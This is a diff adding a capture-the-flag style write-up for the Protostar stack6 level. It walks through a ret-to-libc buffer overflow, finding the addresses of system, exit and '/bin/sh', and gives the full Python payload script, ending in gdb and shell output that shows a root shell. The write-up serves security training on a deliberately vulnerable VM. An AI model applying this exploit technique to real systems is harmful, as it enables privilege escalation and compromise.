@@ -274,7 +274,90 @@ Stack5 :
    Solution uploaded. Writeup todo
 
 Stack6 :
-   //TODO
+   If we try to overwrite "ret" with any address on stack then program would exit because of the codeblock shown below(because stack addresses start at 0xbffeb000 and end at 0xc0000000, any address on stack & 0xbf000000 will always result give 0xbf000000). So after getting control over eip we need to jump to some other place in memory that doesn't start with 0xbf*. we can jump to libc which starts at /lib/libc-2.11.2.so. 
+   
+   ```
+     if((ret & 0xbf000000) == 0xbf000000) {
+      printf("bzzzt (%p)\n", ret);
+      _exit(1);
+  }
+   
+   ```
+   proc map:
+   ```
+   (gdb) info proc map
+process 3415
+cmdline = '/opt/protostar/bin/stack6'
+cwd = '/opt/protostar/bin'
+exe = '/opt/protostar/bin/stack6'
+Mapped address spaces:
 
+        Start Addr   End Addr       Size     Offset objfile
+         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
+         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
+        0xb7e96000 0xb7e97000     0x1000          0
+        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
+        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
+        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
+        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
+        0xb7fd9000 0xb7fdc000     0x3000          0
+        0xb7fe0000 0xb7fe2000     0x2000          0
+        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
+        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
+        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
+        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
+        0xbffeb000 0xc0000000    0x15000          0           [stack]
+   ```
+To get a shell we need to execute system("/bin/sh"). To do it first we need the addresses of system and "/bin/sh". binsh can be found in a variety of ways i.e. by adding an environment variable or by searching for "/bin/sh" in memory. I used second one(searching for /bin/sh). It is found at an offset of 11f3bf in /lib/libc-2.11.2.so and /lib/libc-2.11.2.so is loaded at 0xb7e97000 so effective address of /bin/sh in memory would be 0xb7e97000 + 0x11f3bf
+
+```
+user@protostar:~$ strings -a -t x /lib/libc-2.11.2.so | grep /bin/sh
+ 11f3bf /bin/sh
+Python 2.6.6 (r266:84292, Dec 27 2010, 00:02:40)
+[GCC 4.4.5] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> hex(0xb7e97000 + 0x11f3bf)
+'0xb7fb63bfL'
+>>>
+```
+address of system can be found by using gdb
+```
+(gdb) p system                                                      
+$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>    
+(gdb) p exit                                                        
+$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>       
+(gdb)                                                               
+                                                                    
+```
+stack should be set in this pattern : "A"*80 + address_of_system + return_address(this is where eip would return after completing system(/bin/sh) .this doesn't need to be any valid address but im using address of exit function) + arguments_to_system(/bin/sh) in this case
+```
+import struct
+
+padding = "A" * 80
+eip = struct.pack("I", 0xb7ecffb0)    #address of system()
+extra = struct.pack("I",0xb7ec60c0)   # exit address it can be any arbitrary value
+binsh = struct.pack("I",0xb7fb63bf)
+# address of /bin/sh(/bin/sh is found at an offset of 11f3bf in /lib/libc-2.11.2.so and libc is loaded at 0xb7e97000)
+# so actual address of /bin/sh will be 0xb7e97000 + 11f3bf = 0xb7fb63bf
+
+print padding + eip+extra+binsh
+
+```
+and final result is :
+```
+user@protostar:~$ python s6.py > /tmp/out.txt
+user@protostar:~$ (cat /tmp/out.txt; cat ) | /opt/protostar/bin/stack6
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒▒▒▒AAAAAAAAAAAA▒▒▒▒▒`췿췿c▒▒ id
+uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
+uname -a
+Linux protostar 2.6.32-5-686 #1 SMP Mon Oct 3 04:15:24 UTC 2011 i686 GNU/Linux
+who
+user     tty1         2018-02-08 01:24
+user     pts/0        2018-02-08 07:21 (192.168.48.1)
+user     pts/1        2018-02-08 06:04 (192.168.48.1)
+user     pts/2        2018-02-08 06:05 (192.168.48.1)
+user     pts/3        2018-02-08 07:29 (192.168.48.1)
+
+```
 Stack7 :
    //TODO
